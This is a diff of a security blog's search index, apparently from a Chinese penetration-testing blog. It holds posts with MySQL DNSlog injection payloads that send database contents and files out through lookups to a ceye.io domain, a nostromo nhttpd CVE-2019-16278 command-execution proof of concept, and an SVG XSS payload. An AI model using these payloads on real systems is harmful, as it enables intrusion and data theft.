@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Mysql-Dnslog盲注]]></title>
+    <url>%2F2019%2F10%2F21%2FMysql-Dnslog%E7%9B%B2%E6%B3%A8%2F</url>
+    <content type="text"><![CDATA[0x00 为什么用Dnslog盲注 0x01 利用条件 0x02 如何查看mysql是否开启了文件导入导出？ 0x03 构造攻击Payload 0X04 Reference 0x00 为什么用Dnslog盲注 对于SQL盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，Dnslog盲注可以减少发送的请求，直接回显数据实现注入。 0x01 利用条件 数据库的load_file函数必须可用，也就是数据库用户必须要有file_priv权限 其次就是mysql的secure_file_priv不为NULL,有些高版本的mysql中的secure_file_priv默认为NULL secure_file_priv特性secure_file_priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。 0x02 如何查看mysql是否开启了文件导入导出？ 在MySQL 5.5.53版本之前，这个变量默认为空，因此我们就可以使用这些函数。但是在该版本之后，NULL值会禁用这些函数。我们可使用其中的一种方法来检查这个变量的值。Secure_file_priv是一个全局变量且是一个只读变量，也就是说在运行时无法更改。 使用如下命令查看： mysql&gt;show global variables like ‘%secure%’; secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出。 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下。 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制。 总结下如何修改secure_file_priv的值？ windows下：修改my.ini 在[mysqld]内加入secure_file_priv = linux下：修改my.cnf 在[mysqld]内加入secure_file_priv = MYSQL新特性secure_file_priv对读写文件的影响 然后重启mysql，再查询secure_file_priv 0x03 构造攻击Payload 普通payload： 1234560、select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxx.ceye.io\\abc&apos;))1、concat是字符串拼接；2、用4个,因为\\会被转义为:\3、database()就是你要做SQL注入查询的地方4、&apos;.xxxx.ceye.io\abc&apos;就是你的dnslog平台给你的域名5、unc路径 网络共享文件方式 \\dnslog\abc这样的路径 - 上面拼接的结果就是&quot;\\\\ schema_name.dnslog\\abc&quot;，其实相当于访问了带有数据库名称的三级域名，被dnslog捕获到了。 加密payload 利用bur or select hex(“要加密的数据”)即可. 1234加密前： select load_file(concat(&quot;\\\\&quot;,version(),&quot;.dnslog\\abc&quot;));16进制加密后： select load_file(concat(0x5c5c5c5c,version(),0x6xxf62312e7xxb2e307xx36363xx63635c5c616263)); 读配置文件payload 这里构造下payload读取：c:\phpStudy\WWW\phpinfo.php 123456789101112首先select hex(&apos;C:\\phpStudy\\WWW\\phpinfo.php&apos;)得到加密字符串:433A5C70687053747564795C5757575C706870696E666F2E706870然后构造下payload:select load_file(concat(0x5c5c5c5c,(select load_file(0x433A5C70687053747564795C5757575C706870696E666F2E706870)),0x6f6xxxxxx6b2e307xx363xxxxxc5c616263)); //这里用了两个load_file就解决上面所说的问题了。但是你觉得会成功吗 no no no因为文件带有换行符这是不符合 域名规范的 那么我们怎么办呢 加密数据咯用hex() 继续构造payload:select load_file(concat(0x5c5c5c5c,hex((select load_file(0x433A5C70687053747564795C5757575C706870696E666F2E706870))),0x6f6f62xxxx66b2xxx78636xxxx5c5c616263)); 复现如下图： 0X04 Reference- 参考链接： https://xz.aliyun.com/t/3992#toc-1 https://www.freebuf.com/articles/web/201013.html https://www.t00ls.net/thread-44273-1-1.html]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+      <tags>
+        <tag>WEB渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[nostromo nhttpd 路径遍历漏洞]]></title>
     <url>%2F2019%2F10%2F17%2FCVE-2019-16278%2F</url>
     <content type="text"><![CDATA[0X00 简介 0X01 CVE编号 0X02 漏洞威胁等级 0X03 影响范围 0X04 漏洞描述 0X05 漏洞POC 0X06 漏洞复现 0X07 修复建议 0X08 Reference 0X00 简介 nostromo nhttpd是一款开源的Web服务器。 nostromo nhttpd 1.9.6及之前版本中的‘http_verify’函数存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。 0X01 CVE编号 CVE-2019-16278 0X02 漏洞威胁等级 高危 0X03 影响范围 nostromo nhttpd &lt;= 1.9.6 0X04 漏洞描述 nostromo nhttpd 1.9.6及之前版本中的‘http_verify’函数存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。 0X05 漏洞POC CVE-2019-16278.sh 12345678POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0Connection: closeUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0Content-Length: 25 echo echo ifconfig 2&gt;&amp;1 0X06 漏洞复现 记录一下，请参考： https://github.com/vkbiu/CVE/tree/master/CVE-2019-16278 0X07 修复建议 上waf或防火墙配置规则拦截,等待官方修复打补丁。 0X08 Reference 参考链接： http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201910-807 https://git.sp0re.sh/sp0re/Nhttpd-exploits]]></content>
@@ -12,22 +23,22 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[SVG-XSS]]></title>
-    <url>%2F2019%2F10%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-SVG-XSS%2F</url>
-    <content type="text"><![CDATA[SVG-XSS 介绍 SVG文件 Xss Payload SVG-XSS介绍 跨站点脚本（XSS）是一个非常常见的漏洞，涉及在网页中注入javascript代码。从窃取用户Cookie到通过CORS绕过SOP，此漏洞可用于执行各种操作。有许多方法可以定位XSS漏洞，通常会忽略SVG文件。 SVG文件 可缩放矢量图形（SVG）是用于二维图形的基于XML的矢量图像格式，并支持交互性和动画。 以下代码是基本SVG文件的示例： 123&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt; &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;&lt;/svg&gt; SVG文件还支持嵌入式javascript代码。例如，开发人员可能在svg图像中使用javascript，以便他们可以实时进行操作。这可以用于动画和其他任务。 要注意的另一件事是，SVG文件可以视为HTML中的图像。这意味着您可以将SVG文件放置在图像标签中，并且可以完美呈现： 1&lt;img src=&quot;rectangle.svg&quot; alt=&quot;Rectangle&quot; height=&quot;42&quot; width=&quot;42&quot;&gt; Xss Payload 如果网站使用XSS有效负载加载SVG文件，则将执行该文件。开发人员和攻击者都经常忽视这一点。以下是带有警报XSS有效负载的SVG文件示例： 123456789&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt; &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt; &lt;script type=&quot;text/javascript&quot;&gt; alert(&quot;SVG XSS&quot;); &lt;/script&gt;&lt;/svg&gt; 上传时，注意内容类型设置为：Content-Type: image/svg+xml 上传图像后，您只需找出图像上载到的路径即可。如果您使用的是Google chrome，则可以通过右键单击图片并选择“复制图片地址”来轻松完成此操作。如果在查看图像时一切正常，则将执行有效负载。您只是通过SVG文件存储了XSS。]]></content>
+    <title><![CDATA[接口快速测试小技巧(Python)]]></title>
+    <url>%2F2019%2F10%2F11%2F%E6%8E%A5%E5%8F%A3%E5%BF%AB%E9%80%9F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7(Python)%2F</url>
+    <content type="text"><![CDATA[接口快速测试小技巧(Python) 终于找到解决我每次写请求头不停复制粘贴，改格式。之后我们可以这样，提高了测试的效率，免得重复造轮子，不只是支持python，而且还支持多种编程语言转换。🐂🍺 网站：https://curl.trillworks.com]]></content>
       <categories>
-        <category>WEB安全</category>
+        <category>python</category>
       </categories>
       <tags>
         <tag>WEB渗透测试</tag>
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[接口快速测试小技巧(Python)]]></title>
-    <url>%2F2019%2F10%2F11%2F%E6%8E%A5%E5%8F%A3%E5%BF%AB%E9%80%9F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7(Python)%2F</url>
-    <content type="text"><![CDATA[接口快速测试小技巧(Python) 终于找到解决我每次写请求头不停复制粘贴，改格式。之后我们可以这样，提高了测试的效率，免得重复造轮子，不只是支持python，而且还支持多种编程语言转换。🐂🍺 网站：https://curl.trillworks.com]]></content>
+    <title><![CDATA[SVG-XSS]]></title>
+    <url>%2F2019%2F10%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-SVG-XSS%2F</url>
+    <content type="text"><![CDATA[SVG-XSS 介绍 SVG文件 Xss Payload SVG-XSS介绍 跨站点脚本（XSS）是一个非常常见的漏洞，涉及在网页中注入javascript代码。从窃取用户Cookie到通过CORS绕过SOP，此漏洞可用于执行各种操作。有许多方法可以定位XSS漏洞，通常会忽略SVG文件。 SVG文件 可缩放矢量图形（SVG）是用于二维图形的基于XML的矢量图像格式，并支持交互性和动画。 以下代码是基本SVG文件的示例： 123&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt; &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;&lt;/svg&gt; SVG文件还支持嵌入式javascript代码。例如，开发人员可能在svg图像中使用javascript，以便他们可以实时进行操作。这可以用于动画和其他任务。 要注意的另一件事是，SVG文件可以视为HTML中的图像。这意味着您可以将SVG文件放置在图像标签中，并且可以完美呈现： 1&lt;img src=&quot;rectangle.svg&quot; alt=&quot;Rectangle&quot; height=&quot;42&quot; width=&quot;42&quot;&gt; Xss Payload 如果网站使用XSS有效负载加载SVG文件，则将执行该文件。开发人员和攻击者都经常忽视这一点。以下是带有警报XSS有效负载的SVG文件示例： 123456789&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt; &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt; &lt;script type=&quot;text/javascript&quot;&gt; alert(&quot;SVG XSS&quot;); &lt;/script&gt;&lt;/svg&gt; 上传时，注意内容类型设置为：Content-Type: image/svg+xml 上传图像后，您只需找出图像上载到的路径即可。如果您使用的是Google chrome，则可以通过右键单击图片并选择“复制图片地址”来轻松完成此操作。如果在查看图像时一切正常，则将执行有效负载。您只是通过SVG文件存储了XSS。]]></content>
       <categories>
-        <category>python</category>
+        <category>WEB安全</category>
       </categories>
       <tags>
         <tag>WEB渗透测试</tag>
